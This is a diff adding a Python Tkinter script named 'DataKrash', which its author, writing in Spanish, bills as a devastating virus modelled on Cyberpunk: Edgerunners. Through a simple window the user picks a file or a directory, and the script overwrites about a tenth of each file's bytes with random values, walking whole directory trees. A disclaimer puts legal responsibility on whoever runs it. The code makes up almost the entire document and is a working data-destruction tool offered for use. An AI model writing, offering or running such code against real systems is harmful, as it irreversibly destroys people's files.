@@ -1,0 +1,79 @@
+#DataKrash; Un virus devastador que provoca la diseminación de datos corruptos por todas partes. (Basado en la idea de un virus al estilo Cyberpunk: Edgerunners)
+#Siempre se me hizo atractivo la idea de hacer cosas que vieras en las películas y series y hacerlas realidad.
+#Eres responsable del uso de este script si deseas usarlo y de las consecuencias legales que puede conllevar. 
+
+
+#Version Tkinter
+
+#Por David Ruiz
+#Puedes usar mi script siempre y cuando me des créditos en mis redes sociales @viajatech
+#Se agredecido y dale estrella a este repositorio, gracias! 
+
+import os
+import random
+import tkinter as tk
+from tkinter import filedialog, messagebox
+
+
+def corrupt_file(filepath):
+    try:
+        # Leer el archivo en modo binario
+        with open(filepath, 'rb') as file:
+            content = bytearray(file.read())
+
+        # Asegurar que hay algo que corromper
+        if len(content) == 0:
+            raise ValueError("El archivo está vacío")
+
+        # Corromper el contenido
+        num_corruptions = max(1, int(len(content) * 0.1))  # Al menos 1 byte, hasta el 10%
+        for _ in range(num_corruptions):
+            index = random.randint(0, len(content) - 1)
+            content[index] = random.randint(0, 255)
+
+        # Escribir el contenido corrompido de vuelta al archivo
+        with open(filepath, 'wb') as file:
+            file.write(content)
+
+        messagebox.showinfo("Éxito", f"Archivo corrompido: {filepath}")
+    except Exception as e:
+        messagebox.showerror("Error", f"No se pudo corromper {filepath}: {e}")
+
+
+def corrupt_directory(directory):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            filepath = os.path.join(root, file)
+            corrupt_file(filepath)
+
+
+def select_file():
+    filepath = filedialog.askopenfilename()
+    if filepath:
+        corrupt_file(filepath)
+
+
+def select_directory():
+    directory = filedialog.askdirectory()
+    if directory:
+        corrupt_directory(directory)
+
+
+def create_gui():
+    root = tk.Tk()
+    root.title("Corruptor de Archivos")
+
+    label = tk.Label(root, text="Selecciona un archivo o directorio para corromper:")
+    label.pack(pady=10)
+
+    file_button = tk.Button(root, text="Seleccionar Archivo", command=select_file)
+    file_button.pack(pady=5)
+
+    directory_button = tk.Button(root, text="Seleccionar Directorio", command=select_directory)
+    directory_button.pack(pady=5)
+
+    root.mainloop()
+
+
+if __name__ == "__main__":
+    create_gui()
